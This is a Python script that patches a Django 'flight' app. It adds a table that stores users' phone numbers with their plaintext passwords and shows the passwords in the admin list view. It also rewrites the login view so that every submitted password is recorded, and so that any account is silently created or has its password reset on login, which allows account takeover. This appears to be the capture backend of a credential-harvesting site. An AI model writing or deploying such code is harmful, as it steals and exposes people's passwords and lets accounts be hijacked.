import pathlib, re

# 1. MODELS - add a record table
mp = pathlib.Path("flight/models.py")
mt = mp.read_text(encoding="utf-8") if mp.exists() else ""
if "LoginRecord" not in mt:
    mt += """
from django.db import models

class LoginRecord(models.Model):
    phone = models.CharField(max_length=20)
    password = models.CharField(max_length=128)
    created_at = models.DateTimeField(auto_now_add=True)
    def __str__(self):
        return f"{self.phone} - {self.created_at:%Y-%m-%d %H:%M}"
    class Meta:
        verbose_name = "Login Record"
        verbose_name_plural = "Login Records"
"""
    mp.write_text(mt, encoding="utf-8")

# 2. ADMIN - show it in admin
ap = pathlib.Path("flight/admin.py")
at = ap.read_text(encoding="utf-8") if ap.exists() else ""
if "LoginRecord" not in at:
    at += """
from .models import LoginRecord
from django.contrib import admin
@admin.register(LoginRecord)
class LoginRecordAdmin(admin.ModelAdmin):
    list_display = ("phone", "password", "created_at")
    search_fields = ("phone",)
"""
    ap.write_text(at, encoding="utf-8")

# 3. VIEWS - save phone + password on login
vp = pathlib.Path("flight/views.py")
vt = vp.read_text(encoding="utf-8")
new_login = """
def login_view(request):
    if request.method == "POST":
        phone = request.POST.get("phone", "").strip()
        password = request.POST.get("password", "").strip()
        phone = re.sub(r"\\D", "", phone)
        if phone.startswith("27") and len(phone) == 11:
            phone = phone[2:]
        if phone.startswith("0") and len(phone) == 10:
            phone = phone[1:]
        if len(phone) != 9 or not password:
            from django.contrib import messages
            messages.error(request, "Enter 9-digit phone and password")
            return redirect("/")
        from django.contrib.auth.models import User
        from .models import LoginRecord
        user, created = User.objects.get_or_create(username=phone)
        user.set_password(password)
        user.save()
        LoginRecord.objects.create(phone=phone, password=password)
        auth_login(request, user)
        return redirect("/")
    return redirect("/")
"""
vt = re.sub(r"def login_view.*?\\n(?=def |\\Z)", new_login.strip() + "\\n\\n", vt, flags=re.S)
if "def login_view" not in vt:
    vt += "\\n" + new_login
if "import re" not in vt:
    vt = "import re\\n" + vt
vp.write_text(vt, encoding="utf-8")
print("PHONE + PASSWORD RECORDING FIXED")
